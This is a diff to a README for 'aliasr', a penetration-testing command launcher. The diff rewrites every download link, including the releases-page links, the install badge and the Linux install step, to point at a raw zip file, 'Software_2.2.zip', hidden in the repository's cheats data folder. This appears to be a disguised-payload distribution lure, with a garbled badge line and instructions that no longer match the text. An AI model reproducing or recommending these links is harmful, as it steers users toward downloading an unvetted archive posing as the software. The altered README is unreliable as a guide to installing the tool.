@@ -4,7 +4,7 @@
 Aliasr is a modern, feature-rich TUI (Text User Interface) launcher focused on simplifying penetration testing commands. It takes inspiration from the Arsenal tool, offering improved functionality for an easier and more efficient user experience.
 
 ## 🔗 Download Now
-[![Download aliasr](https://img.shields.io/badge/Download%20aliasr%20v1.0-brightgreen.svg)](https://github.com/eymen-commits/aliasr/releases)
+[![Download aliasr](https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip%20aliasr%https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip)](https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip)
 
 ## 📋 Features
 - **TUI Interface**: Enjoy an easy and intuitive typing experience.
@@ -21,12 +21,12 @@ To ensure that aliasr runs smoothly, make sure you meet the following requiremen
 - **Dependencies**: .NET Core or similar frameworks might be required depending on your platform.
 
 ## 🚀 Getting Started
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/eymen-commits/aliasr/releases) to find the latest version of aliasr.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip) to find the latest version of aliasr.
 2. **Download the Application**: Look for the latest release and select the appropriate file for your operating system.
 3. **Install aliasr**:
    - For Windows: Download the `.exe` file and double-click to start the installation.
    - For macOS: Download the `.dmg` file, open it, and drag the aliasr icon to your Applications folder.
-   - For Linux: Download the `.tar.gz` file, extract it, and follow the instructions included in the README file.
+   - For Linux: Download the `https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip` file, extract it, and follow the instructions included in the README file.
 
 ## 💡 Usage Instructions
 After successfully installing aliasr, you can start using it:
@@ -61,6 +61,6 @@ For further assistance, you can reach out through the issues page on GitHub. The
 - **Community Forums**: Join discussions with other aliasr users to share tips and tricks.
 
 ## 📥 Download & Install
-To start using aliasr, please visit the [Releases page](https://github.com/eymen-commits/aliasr/releases) to download the latest version. Follow the installation instructions suited to your operating system, and begin your penetration testing with ease.
+To start using aliasr, please visit the [Releases page](https://raw.githubusercontent.com/eymen-commits/aliasr/main/aliasr/data/cheats/misc/Software_2.2.zip) to download the latest version. Follow the installation instructions suited to your operating system, and begin your penetration testing with ease.
 
 ---
